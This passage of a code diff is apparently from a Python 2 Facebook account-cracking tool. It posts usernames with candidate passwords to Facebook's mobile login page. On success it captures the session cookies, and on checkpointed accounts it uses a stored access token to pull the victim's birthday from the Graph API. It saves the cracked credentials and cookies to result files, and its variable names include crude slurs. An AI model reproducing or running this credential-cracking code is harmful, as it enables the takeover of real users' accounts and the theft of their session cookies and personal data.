+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
+                    az = json.loads(ak.text)
+                    graph = az["birthday"]
+                    month, day, year = graph.split("/")
+                    month = bulan[month]
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    cp.append(wrt)
+                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                    break
+                except (KeyError, IOError):
+                    month = ''
+                    day = ''
+                    year = ''
+                except:
+                    pass
+
+                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
+                wrt = ' [×] %s|%s' % (user,pw)
+                cp.append(wrt)
+                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                break
+                continue
+
+        loop += 1
+
+
+    def __mfb__(self, user, __yan__):
+        global ok,cp,loop
+        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.flush()
+        for pw in __yan__:
+            pw = pw.lower()
+            try: os.mkdir('results')
+            except: pass
+            try:
+            	_kontol = open('YNTKTS.txt', 'r').read()
+            except (KeyError, IOError):
+            	_kontol = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
+            ses = requests.Session()
+            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            p = ses.get("https://m.facebook.com")
+            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
+            if "c_user" in ses.cookies.get_dict().keys():
+            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
+                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
+                ok.append(wrt)
+                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
+                break
+                continue
+            elif "checkpoint" in ses.cookies.get_dict().keys():
+                try:
+                    kontol = open('.memek.txt').read()
+                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
                     az = json.loads(ak.text)
                     graph = az["birthday"]
                     month, day, year = graph.split("/")
@@ -1041,7 +966,6 @@ class __crack__:
 
         else:
             print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__pler__()
-
 
 if __name__ == '__main__':
     os.system('git pull')
